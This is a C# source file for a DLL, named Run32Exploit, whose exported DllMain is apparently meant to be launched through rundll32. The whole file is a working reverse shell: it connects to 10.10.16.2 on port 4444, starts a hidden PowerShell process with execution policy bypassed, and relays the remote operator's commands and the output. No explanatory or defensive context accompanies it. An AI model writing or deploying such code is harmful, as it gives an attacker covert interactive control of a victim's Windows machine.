using RunDll32Exploit;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace Run32Exploit
{
    internal class Program
    {
        private static StreamWriter sw;
        [DllExport("DllMain")]
        public static void DllMain()
        {
            // Check for correct number of arguments
            //if (args.Length != 2)
            //{
            //    Console.WriteLine($"Usage: {Process.GetCurrentProcess().ProcessName} <IP> <Port>");
            //    return;
            //}

            try
            {
                // Connect to <IP> on <Port>/TCP
                var client = new TcpClient();
                //client.Connect(args[0], int.Parse(args[1]));
                client.Connect("10.10.16.2", 4444);

                // Set up input/output streams
                Stream stream = client.GetStream();
                var sr = new StreamReader(stream);
                sw = new StreamWriter(stream);
                sw.WriteLine("Hello");
                sw.Flush();

                // Define a hidden PowerShell (-ep bypass -nologo) process with STDOUT/ERR/IN all redirected
                var p = new Process();
                p.StartInfo.FileName =
                    "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe";
                p.StartInfo.Arguments = "-ep bypass -nologo";
                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.StartInfo.RedirectStandardInput = true;
                p.OutputDataReceived +=
                    new DataReceivedEventHandler(HandleDataReceived);
                p.ErrorDataReceived +=
                    new DataReceivedEventHandler(HandleDataReceived);

                // Start process and begin reading output
                p.Start();
                p.BeginOutputReadLine();
                p.BeginErrorReadLine();

                // Re-route user-input to STDIN of the PowerShell process
                // If we see the user sent "exit", we can stop
                var userInput = "";
                while (!userInput.Equals("exit"))
                {
                    userInput = sr.ReadLine();
                    p.StandardInput.WriteLine(userInput);
                }

                // Wait for PowerShell to exit (based on user-inputted exit), and close the process
                p.WaitForExit();
                client.Close();
            }
            catch (Exception)
            {
            }
        }

        private static void HandleDataReceived(object sender,
            DataReceivedEventArgs e)
        {
            if (e.Data != null)
            {
                sw.WriteLine(e.Data);
                sw.Flush();
            }
        }

    }
}
